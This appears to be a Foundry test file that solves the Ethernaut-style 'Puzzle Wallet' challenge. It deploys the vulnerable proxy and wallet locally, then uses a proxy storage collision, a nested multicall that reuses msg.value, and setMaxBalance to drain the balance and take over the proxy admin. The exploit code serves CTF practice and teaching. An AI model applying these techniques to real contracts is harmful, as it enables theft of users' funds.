// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "./PuzzleWallet.sol";

contract PuzzleWalletTest is Test {
    function testPuzzleWallet() external {
        address proxyAdmin = 0x725595BA16E76ED1F6cC1e1b65A88365cC494824;
        address user1 = address(3);
        address acc = vm.envAddress("AC0");

        vm.deal(proxyAdmin, 10 ether);
        vm.deal(user1, 10 ether);
        vm.deal(acc, 10 ether);

        vm.startPrank(proxyAdmin);

        bytes memory initData = abi.encodeWithSignature("init(uint256)", proxyAdmin);

        PuzzleWallet walletInstance = new PuzzleWallet();
        PuzzleProxy proxy = new PuzzleProxy(proxyAdmin, address(walletInstance), initData);
        PuzzleWallet wallet = PuzzleWallet(address(proxy));

        wallet.addToWhitelist(user1);

        vm.stopPrank();

        vm.prank(user1);
        wallet.deposit{value: 10 ** 15}();

        // Ensure that the instance state reproduced correctly
        require(address(proxy).balance == 10 ** 15, "Test: incorrect proxy balance");
        require(wallet.owner() == proxy.pendingAdmin(), "Test: incorrect wallet owner");

        // Starting exploit
        vm.startPrank(acc);

        uint256 initialWalletBalance = address(wallet).balance;

        proxy.proposeNewAdmin(acc);
        wallet.addToWhitelist(acc);

        bytes[] memory multicalls = new bytes[](4);
        // multicalls[0] = abi.encodeWithSignature("execute(address,uint256,bytes)", acc, 1_000, "");
        multicalls[0] = abi.encodeWithSignature("deposit()");

        // Nested "multicall" to circumvent "msg.value" validation
        bytes[] memory nestedMulticalls = new bytes[](1);
        nestedMulticalls[0] = abi.encodeWithSignature("deposit()");
        multicalls[1] = abi.encodeWithSignature("multicall(bytes[])", nestedMulticalls);

        bytes memory withdrawData = abi.encodeWithSignature(
            "execute(address,uint256,bytes)",
            acc,
            initialWalletBalance,
            ""
        );
        multicalls[2] = withdrawData;
        multicalls[3] = withdrawData;

        bytes memory data = abi.encodeWithSignature("multicall(bytes[])", multicalls);

        address(wallet).call{value: initialWalletBalance}(data);

        require(address(wallet).balance == 0, "Test: incorrect vallet balance");

        address(wallet).call(abi.encodeWithSignature("setMaxBalance(uint256)", acc));

        require(proxy.admin() == acc, "Test: incorrect proxy admin");

        vm.stopPrank();
    }
}
